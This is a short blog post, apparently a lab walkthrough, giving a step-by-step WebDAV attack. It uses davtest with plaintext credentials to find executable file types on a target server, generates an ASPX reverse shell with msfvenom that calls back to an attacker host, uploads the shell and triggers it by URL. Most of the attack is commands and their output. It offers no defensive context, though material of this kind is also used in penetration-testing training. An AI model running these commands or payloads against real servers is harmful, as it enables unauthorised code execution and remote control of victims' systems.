+++
date = '2026-04-15T17:59:18+09:00'
draft = false
title = 'WebDAV Exploitation with davtest'
tags = ["webdav", "davtest"]
+++

# WebDAV Exploitation

WebDAV (Web Distributed Authoring and Versioning) is an HTTP extension that allows clients to perform remote file operations on a web server. When misconfigured, it can be a powerful attack surface — especially if it requires only basic credentials or has loose upload restrictions.

WebDAV typically requires **credentials** to interact with.

## Step 1 — Enumerate Allowed File Types with davtest

`davtest` tests which file types can be uploaded and executed on the target WebDAV server.

```bash
davtest -auth fmcsorley:CrabSharkJellyfish192 -sendbd auto -url http://192.168.158.122
```

```
Created: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.shtml
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jsp
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.jhtml
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cgi
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.cfm
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.pl
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
PUT File: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.php
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.txt
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.aspx
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.asp
Executes: http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/davtest_LOqKQmYZCD2Fd.html
```

The output shows both `.aspx` and `.asp` are executable — meaning we can upload a web shell or reverse shell payload in either format.

## Step 2 — Generate a Reverse Shell Payload

Using `msfvenom`, generate an ASPX reverse shell:

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f aspx -o rev.aspx LHOST=192.168.45.212 LPORT=443
```

## Step 3 — Upload the Payload

Upload the payload using the directory that `davtest` created in step 1:

```bash
davtest -auth fmcsorley:CrabSharkJellyfish192 -uploadfile rev.aspx -uploadloc DavTestDir_LOqKQmYZCD2Fd -url http://192.168.158.122
```

## Step 4 — Trigger the Shell

With a listener ready, browse to the uploaded file to execute it:

```
http://192.168.158.122/DavTestDir_LOqKQmYZCD2Fd/rev.aspx
```

The reverse shell connects back to the attacker machine.
